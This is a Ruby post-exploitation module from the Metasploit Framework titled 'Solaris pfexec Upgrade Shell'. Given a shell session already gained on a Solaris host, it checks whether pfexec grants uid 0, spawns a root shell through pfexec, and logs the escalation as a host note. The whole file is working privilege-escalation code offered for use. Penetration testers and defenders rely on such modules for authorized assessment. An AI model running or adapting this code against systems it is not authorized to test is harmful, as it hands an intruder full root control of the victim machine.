##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Solaris pfexec Upgrade Shell',
      'Description'  => %q{
        This module attempts to upgrade a shell session to UID 0 using pfexec.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['bcoles'],
      'Platform'     => 'solaris',
      'References'   =>
        [
          ['URL', 'https://docs.oracle.com/cd/E19253-01/816-4557/prbactm-1/index.html'],
          ['URL', 'http://www.c0t0d0s0.org/archives/4844-Less-known-Solaris-features-pfexec.html'],
          ['URL', 'http://solaris.wikia.com/wiki/Providing_root_privileges_with_pfexec']
        ],
      'SessionTypes' => ['shell']
    ))
    register_options [
      OptString.new('PFEXEC_PATH', [true, 'Path to pfexec', '/usr/bin/pfexec']),
      OptString.new('SHELL_PATH', [true, 'Path to shell', '/bin/sh'])
    ]
  end

  def shell_path
    datastore['SHELL_PATH'].to_s
  end

  def pfexec_path
    datastore['PFEXEC_PATH'].to_s
  end

  def run
    unless session.type == 'shell'
      fail_with Failure::BadConfig, "This module is not compatible with #{session.type} sessions"
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless command_exists? pfexec_path
      fail_with Failure::NotVulnerable, "#{pfexec_path} does not exist"
    end

    user = cmd_exec('id -un').to_s

    print_status "Trying pfexec as `#{user}' ..."

    res = cmd_exec "#{pfexec_path} #{shell_path} -c id"
    vprint_status res

    unless res.include? 'uid=0'
      fail_with Failure::NotVulnerable, "User `#{user}' does not have permission to escalate with pfexec"
    end

    print_good 'Success! Upgrading session ...'

    cmd_exec "#{pfexec_path} #{shell_path}"

    unless is_root?
      fail_with Failure::NotVulnerable, 'Failed to escalate'
    end

    print_good 'Success! root shell secured'
    report_note(
      :host => session,
      :type => 'host.escalation',
      :data => "User `#{user}' pfexec'ed to a root shell"
    )
  end
end
